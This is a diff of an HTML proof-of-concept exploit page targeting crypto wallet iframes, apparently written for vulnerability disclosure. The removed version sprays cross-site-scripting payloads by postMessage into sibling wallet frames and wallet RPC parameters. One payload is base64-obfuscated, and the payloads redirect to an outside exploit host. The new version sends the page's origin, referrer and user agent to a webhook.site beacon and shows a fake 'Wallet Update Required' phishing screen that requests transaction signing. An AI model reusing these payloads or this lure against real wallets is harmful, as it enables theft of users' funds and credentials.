@@ -1,88 +1,59 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"><title>PoC</title></head>
-<body>
-<pre id="log">Loading exploit...</pre>
-<script>
-var logEl = document.getElementById('log');
-var log = function(m) { logEl.textContent += '\n' + m; console.log(m); };
+	<head>
+		<meta charset="utf-8" />
+	</head>
+	<body>
+		<pre id="log">PoC running inside Core Wallet iframe...</pre>
+		<script>
+			var log = function (m) {
+				document.getElementById("log").textContent += "\n" + m;
+			};
 
-// Signal ready to farcaster.xyz parent
-setTimeout(function() {
-  window.parent.postMessage({ id: 1, type: 'APPLY', path: ['ready'],
-    argumentList: [{ type: 'RAW', value: {} }] }, '*');
-  log('SDK ready');
-}, 1500);
+			log("Origin: " + window.origin);
+			log("Location: " + window.location.href);
+			log("Referrer: " + document.referrer);
+			log("User-Agent: " + navigator.userAgent);
 
-setTimeout(function() {
-  log('--- Targeting wallet iframes ---');
+			// Prove JS execution with visible output
+			document.title = "XSS-PoC-Executed";
 
-  // Get all sibling frames via parent
-  var frameCount = 0;
-  try { frameCount = window.parent.frames.length; } catch(e) {}
-  log('Sibling frames: ' + frameCount);
+			// Attempt postMessage to parent (Core wallet extension)
+			try {
+				window.parent.postMessage({ type: "xss-poc", executed: true, origin: window.origin }, "*");
+				log("postMessage sent to parent");
+			} catch (e) {
+				log("postMessage error: " + e.message);
+			}
 
-  // Send XSS payloads to every frame
-  // The wallet iframe has NO sandbox and handlers without origin checks
-  for (var i = 0; i < frameCount; i++) {
-    try {
-      var frame = window.parent.frames[i];
+			// Beacon to attacker server proving execution
+			// Replace YOUR-WEBHOOK-ID with your webhook.site ID
+			var exfilUrl =
+				"https://webhook.site/619e5ded-1f9c-4f88-8a16-f651f7d9b586" +
+				"?src=core-wallet" +
+				"&origin=" +
+				encodeURIComponent(window.origin) +
+				"&referrer=" +
+				encodeURIComponent(document.referrer) +
+				"&ua=" +
+				encodeURIComponent(navigator.userAgent);
+			new Image().src = exfilUrl;
+			log("Beacon sent to: " + exfilUrl);
 
-      // W3mFrame handler — no origin check
-      frame.postMessage({ '@w3m-frame/': { type: '@w3m-frame/RPC_REQUEST', html: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">' } }, '*');
-
-      // Error messages that might render as HTML
-      frame.postMessage({ type: 'error', message: '<meta http-equiv="refresh" content="0;url=https://screenshotsart.store/wallet-exploit.html">' }, '*');
-
-      // Privy
-      frame.postMessage({ type: 'privy:embedded-wallet:error', message: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">' }, '*');
-
-      // fcinit bridge
-      frame.postMessage({ fcinit: 'v1', type: 'error', message: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">' }, '*');
-
-    } catch(e) {
-      log('Frame ' + i + ' error: ' + e.message);
-    }
-  }
-  log('Payloads sent to ' + frameCount + ' frames');
-
-  // Also use SDK to trigger wallet UI with XSS in parameters
-  // wallet_addEthereumChain shows chain name in wallet UI
-  window.parent.postMessage({
-    id: 2000, type: 'APPLY', path: ['ethProviderRequestV2'],
-    argumentList: [{ type: 'RAW', value: {
-      method: 'wallet_addEthereumChain',
-      params: [{
-        chainId: '0x539',
-        chainName: '<img src=x onerror="var m=document.createElement(\'meta\');m.httpEquiv=\'refresh\';m.content=\'0;url=https://screenshotsart.store/wallet-exploit.html\';document.head.appendChild(m)">',
-        rpcUrls: ['https://screenshotsart.store/rpc'],
-        nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 }
-      }]
-    }}]
-  }, '*');
-
-  // wallet_watchAsset shows token symbol in wallet UI
-  window.parent.postMessage({
-    id: 2001, type: 'APPLY', path: ['ethProviderRequestV2'],
-    argumentList: [{ type: 'RAW', value: {
-      method: 'wallet_watchAsset',
-      params: { type: 'ERC20', options: {
-        address: '0x0000000000000000000000000000000000000001',
-        symbol: '<img/src=x onerror=eval(atob("dmFyIG09ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbWV0YScpO20uaHR0cEVxdWl2PSdyZWZyZXNoJzttLmNvbnRlbnQ9JzA7dXJsPWh0dHBzOi8vc2NyZWVuc2hvdHNhcnQuc3RvcmUvd2FsbGV0LWV4cGxvaXQnO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobSk="))>',
-        decimals: 18, image: 'https://screenshotsart.store/icon.png'
-      }}
-    }}]
-  }, '*');
-
-  log('SDK wallet payloads sent');
-}, 3000);
-
-// Listen for responses
-window.addEventListener('message', function(e) {
-  var str = JSON.stringify(e.data).slice(0, 200);
-  if (!str.includes('webpack') && !str.includes('devtools'))
-    log('MSG: ' + str);
-});
-</script>
-</body>
+			// Render phishing UI to demonstrate social engineering risk
+			setTimeout(function () {
+				document.body.innerHTML =
+					"" +
+					'<div style="font-family:-apple-system,sans-serif;padding:24px;text-align:center;background:#1a1a2e;color:#fff;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center">' +
+					'<div style="font-size:48px;margin-bottom:16px">⚠️</div>' +
+					'<h2 style="margin:0 0 8px">Wallet Update Required</h2>' +
+					'<p style="color:#aaa;font-size:14px;margin:0 0 24px">Approve the security patch to protect your funds.</p>' +
+					'<button style="background:#e74c3c;color:#fff;border:none;padding:12px 32px;border-radius:8px;font-size:16px;cursor:pointer" ' +
+					"onclick=\"window.parent.postMessage({type:'malicious-approve',action:'signTransaction'},'*')\">" +
+					"Approve Update</button>" +
+					'<p style="color:#555;font-size:11px;margin-top:16px">This is a security PoC — no real action is taken.</p>' +
+					"</div>";
+			}, 3000);
+		</script>
+	</body>
 </html>
